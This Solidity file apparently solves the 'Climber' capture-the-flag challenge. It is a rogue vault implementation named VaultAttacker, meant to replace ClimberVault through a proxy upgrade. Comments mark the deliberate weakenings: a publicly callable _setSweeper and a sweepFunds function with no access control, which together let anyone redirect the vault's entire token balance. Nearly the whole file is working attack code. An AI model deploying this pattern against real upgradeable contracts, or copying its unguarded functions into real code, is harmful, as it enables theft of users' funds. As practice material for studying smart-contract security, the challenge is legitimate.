// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "./ClimberTimelock.sol";

import "hardhat/console.sol";

/**
 * @title VaultAttacker
 * @dev This is the bad vault meant to replace ClimberVault
 * @author 0xInfectedF
 */
contract VaultAttacker is Initializable, OwnableUpgradeable, UUPSUpgradeable {

    uint256 public constant WITHDRAWAL_LIMIT = 1 ether;
    uint256 public constant WAITING_PERIOD = 15 days;

    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    modifier onlySweeper() {
        require(msg.sender == _sweeper, "Caller must be sweeper");
        _;
    }

    /// @custom:oz-upgrades-unsafe-allow constructor
    //0xInfectedF: removed initializer modifier
    constructor() {}

    function initialize(address admin, address proposer, address sweeper) initializer external {
        // Initialize inheritance chain
        console.log("VaultAttacker.initialize: entered");
        __Ownable_init();
        __UUPSUpgradeable_init();

        // Deploy timelock and transfer ownership to it
        transferOwnership(address(new ClimberTimelock(admin, proposer)));
        _setSweeper(sweeper);
        
        _setLastWithdrawal(block.timestamp);
        _lastWithdrawalTimestamp = block.timestamp;
    }

    // Allows the owner to send a limited amount of tokens to a recipient every now and then
    function withdraw(address tokenAddress, address recipient, uint256 amount) external onlyOwner {
        require(amount <= WITHDRAWAL_LIMIT, "Withdrawing too much");
        require(block.timestamp > _lastWithdrawalTimestamp + WAITING_PERIOD, "Try later");
        
        _setLastWithdrawal(block.timestamp);

        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(recipient, amount), "Transfer failed");
    }

    function sweepFunds(address tokenAddress) external {
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(_sweeper, token.balanceOf(address(this))), "Transfer failed");
    }

    function getSweeper() external view returns (address) {
        return _sweeper;
    }

    //0xInfectedF: modified to public
    function _setSweeper(address newSweeper) public {
        _sweeper = newSweeper;
    }

    function getLastWithdrawalTimestamp() external view returns (uint256) {
        return _lastWithdrawalTimestamp;
    }

    function _setLastWithdrawal(uint256 timestamp) internal {
        _lastWithdrawalTimestamp = timestamp;
    }

    function _authorizeUpgrade(address newImplementation) internal onlyOwner override {}
}